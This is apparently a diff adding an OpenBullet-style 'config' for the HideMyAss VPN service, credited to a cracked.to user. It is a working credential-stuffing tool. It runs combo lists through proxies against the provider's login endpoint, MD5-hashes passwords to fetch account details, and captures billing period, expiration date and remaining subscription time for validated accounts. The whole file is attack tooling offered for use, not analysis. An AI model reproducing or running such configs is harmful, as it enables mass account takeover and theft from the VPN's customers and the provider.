@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "HIDEMYASS",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-14T15:09:37.5043763+01:00",
+  "AdditionalInfo": "FULL CAPTURE: Period, Expiration Date, Remaining Time",
+  "Author": "cracked.to/FanTaZyX",
+  "Version": "1.0.0",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://securenetconnection.com/pptpfetch/?ng=1" 
+  CONTENT "u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login incorrect" 
+  KEYCHAIN Success OR 
+    KEY "PPTP" 
+
+FUNCTION Hash MD5 "<PASS>" -> VAR "pass" 
+
+REQUEST GET "https://securenetconnection.com/vpncontrol/accounts/info28/<USER>/<pass>" 
+  
+
+#PERIOD PARSE "<SOURCE>" LR "BILLING_CYCLE:" "NEXT_BILL" CreateEmpty=FALSE -> CAP "PERIOD" 
+
+#EXPIRATION_DATE PARSE "<SOURCE>" LR "NEXT_BILL:" "TIME_UNTIL" CreateEmpty=FALSE -> CAP "EXPIRATION DATE" 
+
+#REMAINING_TIME PARSE "<SOURCE>" LR "TIME_UNTIL:" "" CreateEmpty=FALSE -> CAP "REMAINING TIME" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<PERIOD>" EqualTo "" 
+
